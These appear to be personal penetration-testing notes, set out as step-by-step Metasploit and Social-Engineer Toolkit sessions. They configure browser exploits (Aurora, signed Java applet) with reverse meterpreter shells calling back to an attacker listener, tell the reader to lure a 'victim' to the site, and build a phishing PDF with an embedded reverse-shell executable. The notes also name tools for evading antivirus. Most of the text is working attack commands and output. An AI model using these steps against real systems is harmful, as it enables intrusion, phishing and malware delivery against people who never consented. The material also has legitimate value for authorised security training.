Advanced Exploitation


[*] Metasploit Generate local Website
    msf5 > use exploit/windows/browser/ms10_002_aurora 
    msf5 exploit(windows/browser/ms10_002_aurora) > set uripath class
    uripath => class
    msf5 exploit(windows/browser/ms10_002_aurora) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf5 exploit(windows/browser/ms10_002_aurora) > set LHOST 192.168.1.80
    LHOST => 192.168.1.80
    msf5 exploit(windows/browser/ms10_002_aurora) > run
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.
    [*] Started reverse TCP handler on 0.0.0.0:4444 
    msf5 exploit(windows/browser/ms10_002_aurora) > [*] Using URL: http://0.0.0.0:8080/class
    [*] Local IP: http://192.168.122.238:8080/class
    [*] Server started.

    HAVE VICTIM VISIT YOUR WEBSITE
    SESSION CREATED - SESSION LIVES ON PID NEED TO MOVE TO A LONG RUNNING PID

    meterpreter > migrate 3888

    AVOID BABYSITTING, TO AUTOMATE THIS PID MIGRATE:
    msf5 exploit(windows/browser/ms10_002_aurora) > set PrependMigrate true
    PrependMigrate => true

[*] Exploit java
    msf5 exploit(windows/browser/ms10_002_aurora) > use exploit/multi/browser/java_signed_applet 
    msf5 exploit(multi/browser/java_signed_applet) > set appletname bulbsec
    appletname => bulbsec
    msf5 exploit(multi/browser/java_signed_applet) > set uripath applet
    uripath => applet
    msf5 exploit(multi/browser/java_signed_applet) > set target 0
    target => 0
    msf5 exploit(multi/browser/java_signed_applet) > set payload java/meterpreter/reverse_tcp 
    payload => java/meterpreter/reverse_tcp
    msf5 exploit(multi/browser/java_signed_applet) > set LHOST 192.168.1.80
    LHOST => 192.168.1.80
    msf5 exploit(multi/browser/java_signed_applet) > 
    [*] Started reverse TCP handler on 0.0.0.0:4444 
    [*] Using URL: http://0.0.0.0:8080/applet
    [*] Local IP: http://192.168.122.238:8080/applet
    [*] Server started.

    HAVE VICTIM VISIT YOUR WEBSITE
    POPUP APPEARS TO RUN APPLET
    REVERSE METERPRETER SHELL CREATED

[*] Social Engineering Toolkit (SET | setoolkit)
    Example of PDF reverse TCP for Windows
         Select from the menu:
        
           1) Social-Engineering Attacks
           2) Penetration Testing (Fast-Track)
           3) Third Party Modules
           4) Update the Social-Engineer Toolkit
           5) Update SET configuration
           6) Help, Credits, and About
        
          99) Exit the Social-Engineer Toolkit
        
        set> 1
        
         Select from the menu:
        
           1) Spear-Phishing Attack Vectors
           2) Website Attack Vectors
           3) Infectious Media Generator
           4) Create a Payload and Listener
           5) Mass Mailer Attack
           6) Arduino-Based Attack Vector
           7) Wireless Access Point Attack Vector
           8) QRCode Generator Attack Vector
           9) Powershell Attack Vectors
          10) Third Party Modules
        
          99) Return back to the main menu.
        
        set> 1
        
         The Spearphishing module allows you to specially craft email messages and send
         them to a large (or small) number of people with attached fileformat malicious
         payloads. If you want to spoof your email address, be sure "Sendmail" is in-
         stalled (apt-get install sendmail) and change the config/set_config SENDMAIL=OFF
         flag to SENDMAIL=ON.
        
         There are two options, one is getting your feet wet and letting SET do
         everything for you (option 1), the second is to create your own FileFormat
         payload and use it in your own attack. Either way, good luck and enjoy!
        
           1) Perform a Mass Email Attack
           2) Create a FileFormat Payload
           3) Create a Social-Engineering Template
        
          99) Return to Main Menu
        
        set:phishing>1
        /usr/share/metasploit-framework/
        
         Select the file format exploit you want.
         The default is the PDF embedded EXE.
        
                   ********** PAYLOADS **********
        
           1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
           2) SET Custom Written Document UNC LM SMB Capture Attack
           3) MS15-100 Microsoft Windows Media Center MCL Vulnerability
           4) MS14-017 Microsoft Word RTF Object Confusion (2014-04-01)
           5) Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow
           6) Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)
           7) Adobe Flash Player "Button" Remote Code Execution
           8) Adobe CoolType SING Table "uniqueName" Overflow
           9) Adobe Flash Player "newfunction" Invalid Pointer Use
          10) Adobe Collab.collectEmailInfo Buffer Overflow
          11) Adobe Collab.getIcon Buffer Overflow
          12) Adobe JBIG2Decode Memory Corruption Exploit
          13) Adobe PDF Embedded EXE Social Engineering
          14) Adobe util.printf() Buffer Overflow
          15) Custom EXE to VBA (sent via RAR) (RAR required)
          16) Adobe U3D CLODProgressiveMeshDeclaration Array Overrun
          17) Adobe PDF Embedded EXE Social Engineering (NOJS)
          18) Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow
          19) Apple QuickTime PICT PnSize Buffer Overflow
          20) Nuance PDF Reader v6.0 Launch Stack Buffer Overflow
          21) Adobe Reader u3D Memory Corruption Vulnerability
          22) MSCOMCTL ActiveX Buffer Overflow (ms12-027)
        
        set:payloads>13
        
        
        [-] Default payload creation selected. SET will generate a normal PDF with embedded EXE.
        
            1. Use your own PDF for attack
            2. Use built-in BLANK PDF for attack

        set:payloads>2
        
           1) Windows Reverse TCP Shell              Spawn a command shell on victim and send back to attacker
           2) Windows Meterpreter Reverse_TCP        Spawn a meterpreter shell on victim and send back to attacker
           3) Windows Reverse VNC DLL                Spawn a VNC server on victim and send back to attacker
           4) Windows Reverse TCP Shell (x64)        Windows X64 Command Shell, Reverse TCP Inline
           5) Windows Meterpreter Reverse_TCP (X64)  Connect back to the attacker (Windows x64), Meterpreter
           6) Windows Shell Bind_TCP (X64)           Execute payload and create an accepting port on remote system
           7) Windows Meterpreter Reverse HTTPS      Tunnel communication over HTTP using SSL and use Meterpreter
        
        set:payloads>2
        set> IP address or URL (www.ex.com) for the payload listener (LHOST) [192.168.1.80]: 
        set:payloads> Port to connect back on [443]:
        [-] Defaulting to port 443...
        [*] All good! The directories were created.
        [-] Generating fileformat exploit...
        [*] Waiting for payload generation to complete (be patient, takes a bit)...
        [*] Waiting for payload generation to complete (be patient, takes a bit)...
        [*] Waiting for payload generation to complete (be patient, takes a bit)...
        [*] Waiting for payload generation to complete (be patient, takes a bit)...
        [*] Waiting for payload generation to complete (be patient, takes a bit)...
        [*] Waiting for payload generation to complete (be patient, takes a bit)...
        [*] Waiting for payload generation to complete (be patient, takes a bit)...
        [*] Payload creation complete.
        [*] All payloads get sent to the template.pdf directory
        ..
        ..

        Play with the site cloner and email phishing. These are going to be the most useful for general purposes.


[*] Antivirus Evasion
    The intent here is to create a payload, and encrypt with an unknown fingerprint to antivirus databases.
    Tools:
        msfvenom - create payloads for metasploit reverse shells
        hyperion - encode to bypass antivirus
